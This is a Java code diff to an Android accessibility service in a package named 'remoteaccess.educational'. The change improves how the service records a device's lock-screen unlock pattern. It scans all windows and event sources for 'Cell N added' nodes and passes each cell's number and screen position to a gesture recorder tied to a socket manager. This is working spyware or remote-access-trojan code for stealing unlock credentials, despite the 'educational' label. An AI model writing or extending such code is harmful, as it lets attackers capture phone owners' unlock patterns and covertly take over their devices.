@@ -527,17 +527,47 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     com.remoteaccess.educational.network.SocketManager
                             .getInstance(this).getGestureRecorder();
             if (gr == null) return;
-            // Prefer scanning from root for full coverage; fall back to event source
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                scanNodeForAdvancedUnlockCells(root, gr);
-                root.recycle();
-            } else {
-                AccessibilityNodeInfo source = event.getSource();
-                if (source != null) {
-                    scanNodeForAdvancedUnlockCells(source, gr);
-                    source.recycle();
+
+            // Use a per-event seen-set so scanning multiple windows/sources in the
+            // same event never reports the same cell number twice.
+            java.util.Set<Integer> reportedThisEvent = new java.util.HashSet<>();
+
+            boolean scanned = false;
+
+            // 1. Try all windows — most reliable on lock screen where the active
+            //    window may differ from the pattern-view window.
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+                try {
+                    List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+                    if (windows != null) {
+                        for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                            try {
+                                AccessibilityNodeInfo root = win.getRoot();
+                                if (root != null) {
+                                    scanNodeForAdvancedUnlockCells(root, gr, reportedThisEvent);
+                                    root.recycle();
+                                    scanned = true;
+                                }
+                            } catch (Exception ignored) {}
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            // 2. Try the active window root as a fallback
+            if (!scanned) {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    scanNodeForAdvancedUnlockCells(root, gr, reportedThisEvent);
+                    root.recycle();
                 }
+            }
+
+            // 3. Always also scan the event source node — cheapest and most direct
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                scanNodeForAdvancedUnlockCells(source, gr, reportedThisEvent);
+                source.recycle();
             }
         } catch (Exception ignored) {}
     }
@@ -549,23 +579,24 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * them to the GestureRecorder.
      */
     private void scanNodeForAdvancedUnlockCells(AccessibilityNodeInfo node,
-            com.remoteaccess.educational.commands.GestureRecorder gr) {
+            com.remoteaccess.educational.commands.GestureRecorder gr,
+            java.util.Set<Integer> reportedThisEvent) {
         if (node == null) return;
         try {
-            String[] toCheck = new String[2];
             CharSequence d = node.getContentDescription();
             CharSequence t = node.getText();
-            toCheck[0] = d != null ? d.toString() : null;
-            toCheck[1] = t != null ? t.toString() : null;
+            String[] toCheck = { d != null ? d.toString() : null, t != null ? t.toString() : null };
             for (String s : toCheck) {
                 if (s != null && s.startsWith("Cell ") && s.endsWith(" added")) {
                     try {
                         String numStr = s.substring(5, s.length() - 6).trim();
                         int cellNum = Integer.parseInt(numStr);
-                        if (cellNum >= 1 && cellNum <= 9) {
+                        if (cellNum >= 1 && cellNum <= 9
+                                && !reportedThisEvent.contains(cellNum)) {
                             android.graphics.Rect bounds = new android.graphics.Rect();
                             node.getBoundsInScreen(bounds);
                             if (bounds.width() > 0 && bounds.height() > 0) {
+                                reportedThisEvent.add(cellNum);
                                 gr.onAdvancedUnlockCellDetected(cellNum,
                                         bounds.left, bounds.top, bounds.right, bounds.bottom);
                             }
@@ -578,7 +609,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 try {
                     AccessibilityNodeInfo child = node.getChild(i);
                     if (child != null) {
-                        scanNodeForAdvancedUnlockCells(child, gr);
+                        scanNodeForAdvancedUnlockCells(child, gr, reportedThisEvent);
                         child.recycle();
                     }
                 } catch (Exception ignored) {}
